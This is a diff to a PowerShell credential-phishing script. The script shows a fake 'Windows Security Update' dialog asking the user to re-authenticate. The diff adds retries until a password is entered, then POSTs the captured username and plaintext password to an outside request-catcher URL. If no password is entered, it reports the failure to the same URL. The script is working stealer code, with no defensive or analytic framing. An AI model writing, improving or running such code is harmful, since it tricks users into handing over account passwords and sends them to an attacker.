@@ -238,24 +238,48 @@ Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body 
 
 # ============================== [PROMPT FOR CREDENTIALS] ==============================
 
-try {
-    $cred = $Host.ui.PromptForCredential('Windows Security Update', 'Due to recent changes, please re-authenticate:', $env:USERNAME, '')
-    $enteredUsername = $cred.UserName
-    $enteredPassword = $cred.GetNetworkCredential().Password
-} catch {
-    $enteredUsername = "Prompt failed"
-    $enteredPassword = "Prompt failed"
-}
+$attempt = 0
+$maxAttempts = 3
+$enteredUsername = ""
+$enteredPassword = ""
 
-# ============================== [SEND CREDENTIALS] ==============================
+do {
+    try {
+        $cred = $Host.ui.PromptForCredential(
+            'Windows Security Update',
+            'Due to recent changes, please re-authenticate:',
+            $env:USERNAME,
+            ''
+        )
+        $enteredUsername = $cred.UserName
+        $enteredPassword = $cred.GetNetworkCredential().Password
+    } catch {
+        $enteredUsername = "Prompt failed"
+        $enteredPassword = ""
+    }
 
-Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
-    debug = @"
+    $attempt++
+} while (($enteredPassword -eq "") -and ($attempt -lt $maxAttempts))
+
+# ============================== [SEND CREDENTIALS IF ENTERED] ==============================
+
+if ($enteredPassword -ne "") {
+    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
+        debug = @"
 ===== [Captured Credentials] =====
 Username: $enteredUsername
 Password: $enteredPassword
 "@
+    }
+} else {
+    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" -Method POST -Body @{
+        debug = "Credential prompt failed or skipped after $attempt attempt(s)."
+    }
 }
+
+# ============================== [WAIT BEFORE EXIT] ==============================
+
+Start-Sleep -Seconds 3
 
 
 # ============================== [END] ==============================
